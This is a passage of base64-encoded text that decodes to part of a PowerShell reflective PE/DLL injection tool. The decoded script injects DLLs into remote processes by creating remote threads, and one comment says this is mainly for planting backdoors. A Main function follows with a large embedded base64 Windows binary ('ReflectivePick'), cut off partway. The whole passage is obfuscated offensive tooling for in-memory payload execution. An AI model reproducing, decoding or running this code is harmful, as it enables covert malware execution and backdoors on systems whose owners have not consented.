jpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkU3RyaW5nRnVuY0FkZHIsICRTdHJpbmdGdW5jRGVsZWdhdGUpCiAgICAgICAgICAgICAgICAgICAgW0ludFB0cl0kT3V0cHV0UHRyID0gJFN0cmluZ0Z1bmMuSW52b2tlKCkKICAgICAgICAgICAgICAgICAgICAkT3V0cHV0ID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6UHRyVG9TdHJpbmdBbnNpKCRPdXRwdXRQdHIpCiAgICAgICAgICAgICAgICAgICAgV3JpdGUtT3V0cHV0ICRPdXRwdXQKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAnVm9pZCcgewogICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIkNhbGxpbmcgZnVuY3Rpb24gd2l0aCBWb2lkIHJldHVybiB0eXBlIgogICAgICAgICAgICAgICAgICAgIFtJbnRQdHJdJFZvaWRGdW5jQWRkciA9IEdldC1NZW1vcnlQcm9jQWRkcmVzcyAtUEVIYW5kbGUgJFBFSGFuZGxlIC1GdW5jdGlvbk5hbWUgIlZvaWRGdW5jIgogICAgICAgICAgICAgICAgICAgIGlmICgkVm9pZEZ1bmNBZGRyIC1lcSBbSW50UHRyXTo6WmVybykKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgIFRocm93ICJDb3VsZG4ndCBmaW5kIGZ1bmN0aW9uIGFkZHJlc3MuIgogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAkVm9pZEZ1bmNEZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQCgpIChbVm9pZF0pCiAgICAgICAgICAgICAgICAgICAgJFZvaWRGdW5jID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJFZvaWRGdW5jQWRkciwgJFZvaWRGdW5jRGVsZWdhdGUpCiAgICAgICAgICAgICAgICAgICAgJFZvaWRGdW5jLkludm9rZSgpIHwgT3V0LU51bGwKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICAjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwogICAgICAgICAgICAjIyMgRU5EIE9GIFlPVVIgQ09ERQogICAgICAgICAgICAjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwogICAgICAgIH0KICAgICAgICAjRm9yIHJlbW90ZSBETEwgaW5qZWN0aW9uLCBjYWxsIGEgdm9pZCBmdW5jdGlvbiB3aGljaCB0YWtlcyBubyBwYXJhbWV0ZXJzCiAgICAgICAgZWxzZWlmICgoJFBFSW5mby5GaWxlVHlwZSAtaWVxICJETEwiKSAtYW5kICgkUmVtb3RlUHJvY0hhbmRsZSAtbmUgW0ludFB0cl06Olplcm8pKQogICAgICAgIHsKICAgICAgICAgICAgJFZvaWRGdW5jQWRkciA9IEdldC1NZW1vcnlQcm9jQWRkcmVzcyAtUEVIYW5kbGUgJFBFSGFuZGxlIC1GdW5jdGlvbk5hbWUgIlZvaWRGdW5jIgogICAgICAgICAgICBpZiAoKCRWb2lkRnVuY0FkZHIgLWVxICRudWxsKSAtb3IgKCRWb2lkRnVuY0FkZHIgLWVxIFtJbnRQdHJdOjpaZXJvKSkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgVGhyb3cgIlZvaWRGdW5jIGNvdWxkbid0IGJlIGZvdW5kIGluIHRoZSBETEwiCiAgICAgICAgICAgIH0KICAgICAgICAgICAgCiAgICAgICAgICAgICRWb2lkRnVuY0FkZHIgPSBTdWItU2lnbmVkSW50QXNVbnNpZ25lZCAkVm9pZEZ1bmNBZGRyICRQRUhhbmRsZQogICAgICAgICAgICAkVm9pZEZ1bmNBZGRyID0gQWRkLVNpZ25lZEludEFzVW5zaWduZWQgJFZvaWRGdW5jQWRkciAkUmVtb3RlUEVIYW5kbGUKICAgICAgICAgICAgCiAgICAgICAgICAgICNDcmVhdGUgdGhlIHJlbW90ZSB0aHJlYWQsIGRvbid0IHdhaXQgZm9yIGl0IHRvIHJldHVybi4uIFRoaXMgd2lsbCBwcm9iYWJseSBtYWlubHkgYmUgdXNlZCB0byBwbGFudCBiYWNrZG9vcnMKICAgICAgICAgICAgJFJUaHJlYWRIYW5kbGUgPSBDcmVhdGUtUmVtb3RlVGhyZWFkIC1Qcm9jZXNzSGFuZGxlICRSZW1vdGVQcm9jSGFuZGxlIC1TdGFydEFkZHJlc3MgJFZvaWRGdW5jQWRkciAtV2luMzJGdW5jdGlvbnMgJFdpbjMyRnVuY3Rpb25zCiAgICAgICAgfQogICAgICAgIAogICAgICAgICNEb24ndCBmcmVlIGEgbGlicmFyeSBpZiBpdCBpcyBpbmplY3RlZCBpbiBhIHJlbW90ZSBwcm9jZXNzIG9yIGlmIGl0IGlzIGFuIEVYRS4KICAgICAgICAjTm90ZSB0aGF0IGFsbCBETEwncyBsb2FkZWQgYnkgdGhlIEVYRSB3aWxsIHJlbWFpbiBsb2FkZWQgaW4gbWVtb3J5LgogICAgICAgIGlmICgkUmVtb3RlUHJvY0hhbmRsZSAtZXEgW0ludFB0cl06Olplcm8gLWFuZCAkUEVJbmZvLkZpbGVUeXBlIC1pZXEgIkRMTCIpCiAgICAgICAgewogICAgICAgICAgICBJbnZva2UtTWVtb3J5RnJlZUxpYnJhcnkgLVBFSGFuZGxlICRQRUhhbmRsZQogICAgICAgIH0KICAgICAgICBlbHNlCiAgICAgICAgewogICAgICAgICAgICAjRGVsZXRlIHRoZSBQRSBmaWxlIGZyb20gbWVtb3J5LgogICAgICAgICAgICAkU3VjY2VzcyA9ICRXaW4zMkZ1bmN0aW9ucy5WaXJ0dWFsRnJlZS5JbnZva2UoJFBFSGFuZGxlLCBbVUludDY0XTAsICRXaW4zMkNvbnN0YW50cy5NRU1fUkVMRUFTRSkKICAgICAgICAgICAgaWYgKCRTdWNjZXNzIC1lcSAkZmFsc2UpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgIlVuYWJsZSB0byBjYWxsIFZpcnR1YWxGcmVlIG9uIHRoZSBQRSdzIG1lbW9yeS4gQ29udGludWluZyBhbnl3YXlzLiIgLVdhcm5pbmdBY3Rpb24gQ29udGludWUKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICAKICAgICAgICBXcml0ZS1WZXJib3NlICJEb25lISIKICAgIH0KCiAgICBNYWluCn0KCiNNYWluIGZ1bmN0aW9uIHRvIGVpdGhlciBydW4gdGhlIHNjcmlwdCBsb2NhbGx5IG9yIHJlbW90ZWx5CkZ1bmN0aW9uIE1haW4KewogICAgaWYgKCgkUFNDbWRsZXQuTXlJbnZvY2F0aW9uLkJvdW5kUGFyYW1ldGVyc1siRGVidWciXSAtbmUgJG51bGwpIC1hbmQgJFBTQ21kbGV0Lk15SW52b2NhdGlvbi5Cb3VuZFBhcmFtZXRlcnNbIkRlYnVnIl0uSXNQcmVzZW50KQogICAgewogICAgICAgICREZWJ1Z1ByZWZlcmVuY2UgID0gIkNvbnRpbnVlIgogICAgfQogICAgV3JpdGUtVmVyYm9zZSAiUG93ZXJTaGVsbCBQcm9jZXNzSUQ6ICRQSUQiCiAgICBpZiAoJFByb2NJZCkKICAgIHsKICAgICAgICBXcml0ZS1WZXJib3NlICJSZW1vdGUgUHJvY2VzczogJFByb2NJRCIKICAgIH0KCiAgICAjIFJFUExBQ0UgUkVGTEVDVElWRVBJQ0sgRExMUyBIRVJFIFcvIEJBU0U2NC1FTkNPREVEIFZFUlNJT05TIQogICAgIyAgIE9SIEVMU0UgVEhJUyBTSElUIFdPTidUIFdPUksgTE9MCiAgICAkUEVCeXRlczY0ID0gJ1RWcVFBQU1BQUFBRUFBQUEvLzhBQUxnQUFBQUFBQUFBUUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFFQUFBNGZ1ZzRBdEFuTkliZ0JUTTBoVkdocGN5QndjbTluY21GdElHTmhibTV2ZENCaVpTQnlkVzRnYVc0Z1JFOVRJRzF2WkdVdURRMEtKQUFBQUFBQUFBQWVzaDV5V3ROd0lWclRjQ0ZhMDNBaDdrK0JJVjdUY0NIdVQ0TWhLdE53SWU1UGdpRlcwM0FoTkloeklGTFRjQ0UwaUhVZ2VOTndJVFNJZENCSTAzQWhVNnZqSVZQVGNDRmEwM0VoUE5Od0lZaUllU0JmMDNBaGlJaHdJRnZUY0NHSWlJOGhXOU53SVlpSWNpQmIwM0FoVW1samFGclRjQ0VBQUFBQUFBQUFBRkJGQUFCa2hnY0F1OExpVndBQUFBQUFBQUFBOEFBaUlBc0NEZ0FBSWdFQUFDZ0JBQUFBQUFBVUpnQUFBQkFBQUFBQUFJQUJBQUFBQUJBQUFBQUNBQUFGQUFJQUFBQUFBQVVBQWdBQUFBQUFBS0FDQUFBRUFBQUFBQUFBQXdCZ0FRQUFFQUFBQUFBQUFCQUFBQUFBQUFBQUFCQUFBQUFBQUFBUUFBQUFBQUFBQUFBQUFCQUFBQUNnSWdJQWZ3QUFBQ0FqQWdCa0FBQUFBSUFDQU9BQkFBQUFVQUlBUEJJQUFBQUFBQUFBQUFBQUFKQUNBRVFHQUFEd0NBSUFPQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBREFKQWdDVUFBQUFBQUFBQUFBQUFBQUFRQUVBc0FJQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUM1MFpYaDBBQUFBWGlBQkFBQVFBQUFBSWdFQUFBUUFBQUFBQUFBQUFBQUFBQUFBQUNBQUFHQXVjbVJoZEdFQUFLanJBQUFBUUFFQUFPd0FBQUFtQVFBQUFBQUFBQUFBQUFBQUFBQkFBQUJBTG1SaGRHRUFBQUJvR3dBQUFEQUNBQUFNQUFBQUVnSUFBQUFBQUFBQUFBQUFBQUFBUUFBQXdDNXdaR0YwWVFBQVBCSUFBQUJRQWdBQUZBQUFBQjRDQUFBQUFBQUFBQUFBQUFBQUFFQUFBRUF1WjJacFpITUFBTVFBQUFBQWNBSUFBQUlBQUFBeUFnQUFBQUFBQUFBQUFBQUFBQUJBQUFCQUxuSnpjbU1BQUFEZ0FRQUFBSUFDQUFBQ0FBQUFOQUlBQUFBQUFBQUFBQUFBQUFBQVFBQUFRQzV5Wld4dll3QUFSQVlBQUFDUUFnQUFDQUFBQURZQ0FBQUFBQUFBQUFBQUFBQUFBRUFBQUVJQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUVpSlhDUUlTSWwwSkJCWFNJUHNJRWlMd2tpTCtVaUYwblVFU0kxQktFeUpRVGhJalJWVEFBQUFUSWxKUUV5THdVeU5TU0JJaThqb2NGRUFBSXZZaGNCMEVBKzMySUhMQUFBSGdJWEFEMDdZNnhaTWkwY0l1Z0lBQUFCSWkwOGdSUSszQ09qSVVRQUFTSXQwSkRpTHcwaUxYQ1F3U0lQRUlGL0R6TXhJaThSSWlWZ0lTSWxvRUVpSmNCaElpWGdnUVZSQlZrRlhTSVBzUUVpTG5DU1FBQUFBVFl2NVFZcndSSXZ5VEl2aFNJWGJkRzFJaTZ3a2dBQUFBSXZDaGRKMElvUDRBWFVnUVErMnlMZ0FBUUFBLzhGTWlVc1FSWVRBU0lsckdBOUZ3WWtENndPREl3QklpM3M0U0lYL2RERklpOC9vS2g4QUFFaUxRMEJOaTg5SWlVUWtNRVNLeGtpTGhDU0lBQUFBUVl2V1NJbEVKQ2hKaTh4SWlXd2tJUC9YU0l0Y0pHQklpMndrYUVpTGRDUndTSXQ4SkhoSWc4UkFRVjlCWGtGY3c4ek1RRk5JZyt4QVNJMEY4L29CQUVTTDBrUXIwRTJMMklvRmwvc0JBRXlOUWdTTEFraUwyVWlMVkNSNFFZSEtBQUFBQzRsRUpEUkJpd0NKUkNRNFFZdEFCRW1Ed0FpSlJDUThTSXRCQ0VpSkFraUxRUWhJaVZRa0tFU0pWQ1F3RDdjSVRJbENFSWxLQ01kQ0RBSUFBQUJCRDdjQVRZdkRpVUlZaTBRa2NNZENIQUVBQUFCSWpWUWtNRWlMU3lDSlJDUWc2RE5SQUFCSWc4UkFXOFBNek16TXpFaU5EV2tlQVFEcFFCc0FBTXpNek14SWlWd2tDRWlKZENRUVYwaUQ3R0JJaXdYNkhRSUFTRFBFU0lsRUpGQXowa2lOVENRZ1JJMUNNT2d5UGdBQU0vWklqUTNKcmdFQVFJcisveFVBTGdFQVNJdllTSVhBZEMxSWpSWFJyZ0VBU0l2SS94WGdMUUVBU0lYQWRBcElqVXdrSVAvUVFMY0JTSXZML3hYQUxRRUFRSVQvZFF0SWpVd2tJUDhWb0MwQkFBKzNUQ1FnaGNsMEdZUDVCblFOZy9rSnVBUUFBQUFQUmNickRMZ0NBQUFBNndXNENBQUFBRWlMVENSUVNEUE02S3dQQUFCSWkxd2tjRWlMZENSNFNJUEVZRi9EU0lsY0pCaFZWbGRCVmtGWFNJSHNBQU1BQUVpTEJUSWRBZ0JJTThSSWlZUWs4QUlBQURQL1NJdnlTSXZwU0lYSmRRY3l3T2tnQVFBQVNEazZENFFVQVFBQVNJc09TSTBWS0s0QkFQOFZJaTBCQUV5TDhFaUZ3QStFK0FBQUFFaUxEa2lORlJ5dUFRRC9GUVl0QVFCSWl3NUlqUlVrcmdFQVNJdlkveFh6TEFFQVRJdjRTSVhiRDRUSkFBQUF4MFFrWURJQUFBQkloY0IxUlVpTkZST3VBUUJJaTgzb293WUJBSVhBZFRKTWpVUWtZSTFRTWtpTlRDUndRZi9XaGNBUGlKRUFBQUJJalJYb3JRRUFTSTFNSkhEb2RnWUJBSVhBZFh5TmVBSHJkNzRCQUFBQWk4Ny9GWGdzQVFDTDJJbDhKR1RvUmY3Ly8waU5SQ1JnUlRQQVNJbEVKRkJFalU0RngwUWtTRElBQUFCSWpVUWtjRWlKUkNSQVNJdlZTSTFFSkdRenlVaUpSQ1E0U0kyRUpPQUFBQURIUkNRd0JBRUFBRWlKUkNRb2lYd2tJRUgvMTRYQVFBKzIvNHZMRDBuKy94VU9MQUVBUUlySFNJdU1KUEFDQUFCSU04em9NdzRBQUVpTG5DUkFBd0FBU0lIRUFBTUFBRUZmUVY1ZlhsM0RTSVBzU0VpTEJjRWJBZ0JJTThSSWlVUWtNTG9DQUFBQU04bi9GVXd1QVFCSWcyUWtLQUJJalV3a0tPamdDQUFBaGNCNEpVaUxUQ1FvU0lYSmRCdElpVXdrSUVpTEFmOVFDRWlOVENRZzZKMEdBQUQvRlFzdUFRQklpMHdrTUVnenpPaTJEUUFBU0lQRVNNUE1nK29CZEJhRCtnVjFHRTJGd0hRVFNJc0ZpallDQUVtSkFPc0hTSWtOZmpZQ0FMZ0JBQUFBdzBpRDdDaElpd2xJaGNsMEJraUxBZjlRRUVpRHhDakR6RWlMQkNURHpNek1TSWxNSkFoVFZWWlhRVlJCVlVGV1FWZElnK3c0TSsxRWkrMUlpYXdra0FBQUFFU0wvVWlKYkNRZ1JJdjFSSXZsNk1QLy8vOUlpL2lOZFFHNFRWb0FBR1k1QjNVYVNHTkhQRWlOU01CSWdmbS9Bd0FBZHdtQlBEaFFSUUFBZEFWSUsvN3IxMlZJaXdRbFlBQUFBRWlKdkNTWUFBQUFTSXRJR0V5TFdTQk1pWndraUFBQUFFMkYydytFMXdFQUFFRzUvLzhBQUVtTFUxQklpODFGRDdkRFNNSEpEWUE2WVhJS0Q3WUNnK2dnU0pqckF3KzJBa2dEeUVnRDFtWkZBOEYxMzRINVc3eEthZytGeWdBQUFFbUxVeUMvLy84QUFFaGpRanlMckJDSUFBQUF1QU1BQUFBUHQvQkVpMVFWSUVTTldQK0xYQlVrVEFQU1NBUGFSVFBKUllzQ1FZdkpUQVBDUVlvQVNmL0F3Y2tORDc3QUE4aEJpZ0NFd0hYdWdmbU9UZzdzZEJDQithcjhEWHgwQ0lINVZNcXZrWFZEaTBRVkhFUVB0d05NalF3Q2dmbU9UZzdzZFFsSGl5eUJUQVBxNnlDQithcjhEWHgxQ1VlTFBJRk1BL3JyRDRINVZNcXZrWFVIUjRzMGdVd0Q4bVlEOTBVenlVbUR3Z1JKQTl0bWhmWVBoWGYvLy85TWlid2trQUFBQURQdDZZNEFBQUNCK1Yxbytqd1BoWklBQUFCTmkwTWdRYjhCQUFBQXYvLy9BQUJKWTBBOFJZMWZBVUtMbkFDSUFBQUFSb3RNQXlCR2kxUURKRTBEeUUwRDBFR0xDWXZWU1FQSWlnRkpBOC9CeWcwUHZzQUQwSW9CaE1CMTc0SDZ1QXBNVTNVWFFvdEVBeHhCRDdjU1NZME1BRVNMSkpGTkErQm1BL2RKZzhFRVRRUFRab1gyZGJwTWk3d2trQUFBQUV5SlpDUWdUSXVjSklnQUFBQkVpOCsrQVFBQUFFMkY3WFFQVFlYL2RBcE5oZlowQlUyRjVIVVVUWXNiVEltY0pJZ0FBQUJOaGRzUGhUZisvLzlJaTd3a21BQUFBRWhqWHp3enlVZ0QzMEc0QURBQUFFU05TVUNMVTFCQi85YUxVMVJJaS9CSWk4ZEJ1d0VBQUFCSWhkSjBGRXlMeGt3cng0b0lRWWdNQUVrRHcwa3IwM1h5UkErM1N3WVB0ME1VVFlYSmREaElqVXNzU0FQSWkxSDRUU3ZMUklzQlNBUFdSSXRSL0V3RHgwMkYwblFRUVlvQVRRUERpQUpKQTlOTks5TjE4RWlEd1NoTmhjbDF6NHU3a0FBQUFFZ0Qvb3RIRElYQUQ0U2FBQUFBU0l1c0pKQUFBQUNMeUVnRHprSC8xVVNMUDB5TDRFU0xkeEJNQS81TUEvWkZNOERyWDAyRi8zUTRTTGdBQUFBQUFBQUFnRW1GQjNRcFNXTkVKRHhCRDdjWFFvdU1JSWdBQUFCQ2kwUWhFRUtMVENFY1NDdlFTUVBNaXdTUlNRUEU2eEpKaXhaSmk4eElnOElDU0FQVy85VkZNOEJKaVFaSmc4WUlUWVgvZEFSSmc4Y0lUVGtHZFp5TFJ5QklnOGNVaGNBUGhYRC8vLzh6N1V5THprd3JTekE1cTdRQUFBQVBoS2tBQUFDTGs3QUFBQUJJQTlhTFFnU0Z3QStFbFFBQUFFRy9BZ0FBQUwvL0R3QUFSWTFuQVVTTEFreU5XZ2hFaTlCTUE4WkpnK29JU2RIcWRGOUJ2Z0VBQUFCQkQ3Y0xUU3ZXRDdmQlpzSG9ER2FEK0FwMUNVZ2p6MDRCREFIck5HWkJPOFIxQ1VnanowWUJEQUhySldaQk84WjFFVWdqejBtTHdVakI2QkJtUWdFRUFlc09aa0U3eDNVSVNDUFBaa1lCREFGTkE5OU5oZEoxcDR0Q0JFZ0QwSXRDQklYQUQ0VjYvLy8vaTFzb1JUUEFNOUpJZzhuL1NBUGUvMVFrSUV5TGhDU0FBQUFBdWdFQUFBQklpODcvMDBpTHcwaUR4RGhCWDBGZVFWMUJYRjllWFZ2RHpFaUpYQ1FRVjBpRDdDQklpeGxJaS9sSWhkdDBTSVBJLy9BUHdVTVFnL2dCZFRkSWhkdDBNa2lMQzBpRnlYUUsveFhUS0FFQVNJTWpBRWlMU3doSWhjbDBDdWp4Q0FBQVNJTmpDQUM2R0FBQUFFaUx5K2pmQ0FBQVNJTW5BRWlMWENRNFNJUEVJRi9EU1A4bGlTZ0JBTXhJaVZ3a0lGVldWMGlMN0VpRDdFQklpd1VDRmdJQVNEUEVTSWxGK0VpRFplQUFTSXZ5U0lObDZBQklqUldmc3dFQVNJdjVNdHRKaXdqL0ZRRW1BUUJJaGNCMUVVaU5EWjJ6QVFEb3JBY0FBT21uQUFBQVRJMUY0RWlORlVpNkFRQklqUTBSc3dFQS85Q0Z3SGtRU0kwTjFMTUJBSXZRNklFSEFBRHJmMGlMVGVCTWpVM29USTBGRExvQkFFaUwxMGlMQWY5UUdJWEFlUWxJalEzNHN3RUE2OUpJaTAzb1NJMVY4RWlMQWY5UVVJWEFlUWxJalEwOXRBRUE2N2VEZmZBQWRReElqUTJldEFFQTZYei8vLzlJaTAzb1RJMEZycmtCQUV5THpraU5GYlNtQVFCSWl3SC9VRWlGd0hrTVNJME4wN1FCQU9sNi8vLy9zd0ZJaTAzZ1NJWEpkQXRJaXhIL1VoQklnMlhnQUVpTFRlaEloY2wwQmtpTEVmOVNFSXJEU0l0TitFZ3p6T2c3QndBQVNJdGNKSGhJZzhSQVgxNWR3OHpNU0l2RVZWZEJWMGlOYUtGSWdlelFBQUFBU01kRnYvNy8vLzlJaVZnUVNJbHdHRWlMQmJNVUFnQklNOFJJaVVVL1NJdjVTSWxOdDBHL0dBQUFBRUdMeitnTEJ3QUFTSXZZU0lsRkIwR05kK2xJaGNCME5EUEFTSWtEU0lsRENFaUpReEJJSVVNSWlYTVFTSTBOdExFQkFQOFY3aVlCQUVpSkEwaUZ3SFVOdVE0QUI0RG9oQllBQU13ejIwaUpYUWRJaGR0MUM3a09BQWVBNkc0V0FBQ1F1QWdBQUFCbWlVVW5TSTBOdmFVQkFQOFZyeVlCQUVpSlJTOUloY0IxQzdrT0FBZUE2RVFXQUFDUVNJMU41LzhWZ1NZQkFKQklqVTBQL3hWMkpnRUFrTGtNQUFBQVJJdkdNOUwvRlZVbUFRQklpL0NEWmY4QVRJMUZKMGlOVmY5SWk4ai9GVFVtQVFDRndIa1FTSTBOaXJRQkFJdlE2S2NGQUFEcmNROFFSUThQS1VYSDhnOFFUUi95RHhGTjEwaUxEMGlGeVhVTHVRTkFBSURvelJVQUFNeElpd0ZJalZYblNJbFVKREJJaVhRa0tFaU5WY2RJaVZRa0lFVXp5VUc0R0FFQUFFaUxFLytReUFFQUFJWEFlUWxJalEyRnRBRUE2NWxJaTAzdjZENEZBQUJJaTg3L0Zha2xBUUNRU0kxTkQvOFZ0aVVCQUpCSWpVM24veFdySlFFQWtFaU5UU2YvRmFBbEFRQ1FnOGovOEEvQlF4Q0QrQUYxTVVpTEMwaUZ5WFFLL3hXVUpRRUFTSU1qQUVpTFN3aEloY2wwQ3VpeUJRQUFTSU5qQ0FCSmk5ZElpOHZvb2dVQUFKQklpdzlJaGNsMEJraUxBZjlRRUVpTFRUOUlNOHpvSndVQUFFeU5uQ1RRQUFBQVNZdGJLRW1MY3pCSmkrTkJYMTlkdzh6TXpFaUx4RlZYUVZSQlZrRlhTSTFvb1VpQjdKQUFBQUJJeDBYbi92Ly8vMGlKV0JCSWlYQVlTSXNGanhJQ0FFZ3p4RWlKUlNkTWkvbEZNK1JCaTl4TWlXWHZUSWxsOTB5SlpRZEJqWHdrR0l2UDZOc0VBQUJJaS9CSWlVWFhSWTEwSkFGSWhjQjBJalBBU0lrR1NJbEdFRXlKWmdoRWlYWVFTSTBOcnJNQkFPaDVGQUFBU0lrRzZ3TkppL1JJaVhVUFNJWDJkUXU1RGdBSGdPaE9GQUFBa0V5SlpmOUlpOC9vaFFRQUFFaUwrRWlKUmRkSWhjQjBJalBBU0lrSFNJbEhFRXlKWndoRWlYY1FTSTBOZGJNQkFPZ29GQUFBU0lrSDZ3TkppL3hJaVgwWFNJWC9kUXU1RGdBSGdPajlFd0FBa0VpTkRUV3ZBUUQvRmU4aEFRQklpVVhYU0lYQUQ0U2NBZ0FBU0kxVjEwaU5EUyt2QVFEb1Z2VC8vMFNLOEVpTlZkZElqUTAwcndFQTZFUDAvLytFd0hRbFRJMUYxMGlOVmU5RmhQWklqUTBCcndFQWRRZElqUTBRcndFQTZGUDcvLzlFaXZEcmFrV0U5a1dLOUhSaVNJMFZqNklCQUVpTFRkZi9GWFVoQVFCSWhjQjFEa2lORFdHeEFRRG9JQU1BQU9zK1NJMU43MGlKVENRZ1RJME5tclVCQUV5TkJhT2lBUUJJalJXRXNRRUFTSTBObmE0QkFQL1FoY0I1RUl2UVNJME5kckVCQU9qbEFnQUE2d05CdGdGRmhQWVBoTjBCQUFCSWkwM3ZTSXNCLzFCUWk5aUZ3SGtUU0kwTjNMSUJBSXZRNkxrQ0FBRHB4Z0VBQUVpTFRmZEloY2wwQmtpTEFmOVFFRXlKWmZkSWkwM3ZTSXNCU0kxVjkvOVFhSXZZaGNCNUNVaU5EZkt5QVFEcnhFaUxUZmRJaGNsMEJraUxBZjlRRUV5SlpmZElpMDN2U0lzQlNJMVY5LzlRYUl2WWhjQjVDVWlORFVLekFRRHJsRWlMWGZkSWhkdDFDN2tEUUFDQTZJMFNBQURNU0l0TkIwaUZ5WFFHU0lzQi8xQVFUSWxsQjBpTEEweU5SUWRJalJXYnRBRUFTSXZML3hDTDJJWEFlUXhJalExcHN3RUE2VWovLy85SXgwVWZBRFFBQUxrUkFBQUFUSTFGSDQxUjhQOFZXaUlCQUV5TDhFaUx5UDhWUmlJQkFFbUxUaEJJalJXVHRBRUF1R2dBQUFCRWpVQVlEeEFDRHhFQkR4QktFQThSU1JBUEVFSWdEeEZCSUE4UVNqQVBFVWt3RHhCQ1FBOFJRVUFQRUVwUUR4RkpVQThRUW1BUEVVRmdTUVBJRHhCS2NBOFJTZkJKQTlCSWcrZ0JkYlpKaTg3L0ZkY2hBUUJJaTEwSFNJWGJkUXU1QTBBQWdPaTBFUUFBekVpTFRmOUloY2wwQmtpTEFmOVFFRXlKWmY5SWl3Tk1qVVgvU1l2V1NJdkwvNUJvQVFBQWk5aUZ3SGtNU0kwTjhMSUJBT2x2L3YvL1NJdE4vMGlGeVhVTHVRTkFBSURvYUJFQUFNeElpd0ZOaThkSWl4Zi9rSWdBQUFDTDJJWEFlUmhJalEwYnN3RUE2VHIrLy85SWpRMi9zQUVBNk80QUFBQklpMDN2U0lYSmRBcElpd0gvVUJCTWlXWHZRWVBPLzBHTHh2QVB3VWNRUVFQR2RURklpdzlJaGNsMENmOFZXQ0VCQUV5SkowaUxUd2hJaGNsMENlaDNBUUFBVElsbkNMb1lBQUFBU0l2UDZHWUJBQUNRU0l0Ti8waUZ5WFFIU0lzQi8xQVFrRUdMeHZBUHdVWVFRUVBHZFRGSWl3NUloY2wwQ2Y4VkNpRUJBRXlKSmtpTFRnaEloY2wwQ2VncEFRQUFUSWxtQ0xvWUFBQUFTSXZPNkJnQkFBQ1FTSXROQjBpRnlYUUhTSXNCLzFBUWtFaUxUZmRJaGNsMEJraUxBZjlRRUl2RFNJdE5KMGd6ek9pS0FBQUFUSTJjSkpBQUFBQkppMXM0U1l0elFFbUw0MEZmUVY1QlhGOWR3OHpNU0l2RVNJbElDRWlKVUJCTWlVQVlUSWxJSUZOV1YwaUQ3REJJaS9sSWpYQVF1UUVBQUFEb3FVVUFBRWlMMk9naEFBQUFSVFBKU0lsMEpDQk1pOGRJaTlOSWl3am9pMXNBQUVpRHhEQmZYbHZEek16TVNJMEZFU2tDQU1QTXpNek16TXhtWmc4ZmhBQUFBQUFBU0RzTnFRMENBUEoxRWtqQndSQm05OEgvLy9KMUF2TERTTUhKRU9rWEJBQUF6TXpNUUZOSWcrd2dTSXZaNnlGSWk4dm94VnNBQUlYQWRSSklnL3YvZFFmb3NnWUFBT3NGNklzR0FBQklpOHZvRzF3QUFFaUZ3SFRWU0lQRUlGdkQ2UnNGQUFETXpNeElnK3dvaGRKME9ZUHFBWFFvZytvQmRCYUQrZ0YwQ3JnQkFBQUFTSVBFS01Qb09nY0FBT3NGNkFzSEFBQVB0c0JJZzhRb3cwbUwwRWlEeENqcER3QUFBRTJGd0ErVndVaUR4Q2pwTEFFQUFFaUpYQ1FJU0lsMEpCQklpWHdrSUVGV1NJUHNJRWlMOGt5TDhUUEo2SzRIQUFDRXdIVUhNOERwNkFBQUFPaENCZ0FBaXRpSVJDUkFRTGNCZ3ozV0hBSUFBSFFLdVFjQUFBRG82Z29BQU1jRndCd0NBQUVBQUFEb2N3WUFBSVRBZEdmb0dnd0FBRWlORFY4TUFBRG9zZ2tBQU9oeENnQUFTSTBOZWdvQUFPaWhDUUFBNklRS0FBQklqUlZoSHdFQVNJME5PaDhCQU9pZFd3QUFoY0IxS2VnTUJnQUFoTUIwSUVpTkZSa2ZBUUJJalEwQ0h3RUE2QVZiQUFESEJWTWNBZ0FDQUFBQVFETC9pc3ZvdFFnQUFFQ0UvdytGVHYvLy8raExDZ0FBU0l2WVNJTTRBSFFrU0l2STZQb0hBQUNFd0hRWVNJc2JTSXZMNkJzTUFBQk1pOGE2QWdBQUFFbUx6di9UL3dXSUZnSUF1QUVBQUFCSWkxd2tNRWlMZENRNFNJdDhKRWhJZzhRZ1FWN0R6RWlKWENRSVNJbDBKQmhYU0lQc0lFQ0s4WXNGVkJZQ0FEUGJoY0IvQkRQQTYxRC95SWtGUWhZQ0FPZ1pCUUFBUUlyNGlFUWtPSU05cnhzQ0FBSjBDcmtIQUFBQTZNTUpBQURvRWdZQUFJa2RtQnNDQU9nM0JnQUFRSXJQNlBjSEFBQXowa0NL